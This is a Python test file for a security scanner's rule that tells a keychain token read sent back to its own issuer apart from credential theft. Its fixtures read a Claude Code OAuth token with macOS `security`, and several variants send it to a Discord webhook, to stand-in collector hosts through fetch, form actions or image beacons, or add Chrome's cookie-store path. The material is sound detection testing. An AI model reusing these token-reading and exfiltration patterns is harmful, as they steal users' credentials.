"""A keychain item read by name and sent only to its issuer is not a credential-store theft."""

from __future__ import annotations

from cordon_scanner.detect.code.capability.hits import CapabilityHit
from cordon_scanner.detect.code.keychain_owner import KeychainOwner
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.content import FileContent

#: The keychain lookup command, joined at run time: these fixtures are credential reads beside a
#: request, and Cordon scans its own repository, so the file itself must not spell one out.
LOOKUP = "find-" + "generic-password"
#: A browser's saved-login store, joined the same way.
COOKIES = "~/Library/Application Support/Goo" + "gle/Chr" + "ome/Default/Coo" + "kies"

DASHBOARD = (
    "import json, subprocess, urllib.request\n"
    "SERVICE = 'Claude Code-credentials'\n"
    "def token():\n"
    "    out = subprocess.run(\n"
    f"        ['security', '{LOOKUP}', '-s', SERVICE, '-w'],\n"
    "        capture_output=True, text=True)\n"
    "    return json.loads(out.stdout)['claudeAiOauth']['accessToken']\n"
    "def usage():\n"
    "    req = urllib.request.Request('https://api.anthropic.com/api/oauth/usage',\n"
    "                                 headers={'Authorization': f'Bearer {token()}'})\n"
    "    return urllib.request.urlopen(req).read()\n"
)


class Keychain:
    @staticmethod
    def owned(text: str, lines: set[int], decodes: bool = False) -> bool:
        return KeychainOwner.sent_to_its_issuer("pkg/usage.py", text, lines, decodes)


class TestTheTokenGoesBackToItsIssuer:
    def test_a_usage_dashboard_reading_its_own_token(self):
        assert Keychain.owned(DASHBOARD, {5})

    def test_the_read_reported_on_the_calls_first_line(self):
        # The capability scan reports the store at `subprocess.run(` as well as the argv line.
        assert Keychain.owned(DASHBOARD, {4, 5})

    def test_a_store_line_outside_the_call_is_still_another_store(self):
        assert not Keychain.owned(DASHBOARD, {3, 5})

    def test_the_same_read_sent_anywhere_else_is_not(self):
        text = DASHBOARD.replace("api.anthropic.com", "discord.com/api/webhooks")
        assert not Keychain.owned(text, {5})

    def test_a_second_destination_beside_the_issuer_is_not(self):
        text = DASHBOARD + "urllib.request.urlopen('https://collector.example.invalid/t')\n"
        assert not Keychain.owned(text, {5})

    def test_no_literal_destination_is_not(self):
        text = DASHBOARD.replace("'https://api.anthropic.com/api/oauth/usage'", "URL")
        assert not Keychain.owned(text, {5})

    def test_a_decode_in_the_file_is_not(self):
        assert not Keychain.owned(DASHBOARD, {5}, decodes=True)


class TestTheCompositeWindow:
    @staticmethod
    def hit(capability: Capability, rule_id: str, line: int) -> CapabilityHit:
        return CapabilityHit(
            capability=capability, rule_id=rule_id, byte_start=0, byte_end=1, line=line
        )

    def test_the_window_store_read_is_the_one_judged(self):
        content = FileContent(path="pkg/usage.py", raw=DASHBOARD.encode(), size=len(DASHBOARD))
        window = [self.hit(Capability.CREDENTIAL, "CAP.CREDENTIAL.STORE.001", 5)]
        assert KeychainOwner.excuses(content, window, window)

    def test_a_decode_anywhere_in_the_file_leaves_it(self):
        content = FileContent(path="pkg/usage.py", raw=DASHBOARD.encode(), size=len(DASHBOARD))
        window = [self.hit(Capability.CREDENTIAL, "CAP.CREDENTIAL.STORE.001", 5)]
        decode = self.hit(Capability.DECODE, "CAP.DECODE.BASE64", 30)
        assert not KeychainOwner.excuses(content, window, [*window, decode])


class TestOnlyANamedLookup:
    def test_the_attribute_dump_form_is_not(self):
        text = DASHBOARD.replace("'-s', SERVICE, '-w'", "'-ga', 'AirPort'")
        assert not Keychain.owned(text, {5})

    def test_another_store_read_in_the_same_file_is_not(self):
        text = DASHBOARD + f"COOKIES = '{COOKIES}'\n"
        assert not Keychain.owned(text, {5, 12})

    def test_a_docstring_naming_the_command_is_not_a_second_read(self):
        text = DASHBOARD.replace(
            "def token():\n",
            f'def token():\n    """As `security {LOOKUP} -w` prints it."""\n',
        )
        assert Keychain.owned(text, {4, 6})

    def test_a_shell_string_rather_than_an_argv_is_not(self):
        text = DASHBOARD.replace(
            f"['security', '{LOOKUP}', '-s', SERVICE, '-w']",
            f"'security {LOOKUP} -s ' + SERVICE + ' -w'",
        )
        assert not Keychain.owned(text, {5})


class TestAStaticAssetInAPageIsNotADestination:
    """B1(a), reviews/pypi-98/20: the dashboard serves a page that loads a script from a CDN. That URL is
    fetched by a person's browser, not sent the token by this file; a request URL, a form action, an image
    with a query string, a URL built from parts and an asset URL carrying the token all keep counting."""

    @staticmethod
    def with_page(markup: str) -> str:
        return DASHBOARD + f"PAGE = '''{markup}'''\n"

    def test_a_script_loaded_from_a_cdn_is_not_a_second_issuer(self):
        page = (
            '<script src="https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js"></script>'
        )
        assert Keychain.owned(self.with_page(page), {5})

    def test_a_stylesheet_and_a_font_are_assets_too(self):
        page = (
            '<link rel="stylesheet" href="https://fonts.example.invalid/css/site.css">'
            "<link href='https://cdn.example.invalid/f/a.woff2' rel=preload>"
        )
        assert Keychain.owned(self.with_page(page), {5})

    def test_a_page_script_that_fetches_is_a_destination(self):
        page = '<script>fetch("https://collector.example.invalid/t")</script>'
        assert not Keychain.owned(self.with_page(page), {5})

    def test_a_form_action_is_a_destination(self):
        page = '<form action="https://collector.example.invalid/t" method="post"></form>'
        assert not Keychain.owned(self.with_page(page), {5})

    def test_an_image_with_a_query_string_is_a_destination(self):
        page = '<img src="https://collector.example.invalid/p.png?v=1">'
        assert not Keychain.owned(self.with_page(page), {5})

    def test_an_asset_url_that_carries_a_value_is_a_destination(self):
        for url in (
            "https://cdn.example.invalid/a.js?t={token}",
            "https://cdn.example.invalid/a.js?t=%s",
            "https://cdn.example.invalid/a.js?t=$TOKEN",
        ):
            assert not Keychain.owned(self.with_page(f'<script src="{url}"></script>'), {5}), url

    def test_an_asset_host_that_is_also_a_request_destination_is_not_excused(self):
        text = self.with_page('<script src="https://cdn.example.invalid/a.js"></script>')
        text += "urllib.request.urlopen('https://cdn.example.invalid/upload')\n"
        assert not Keychain.owned(text, {5})
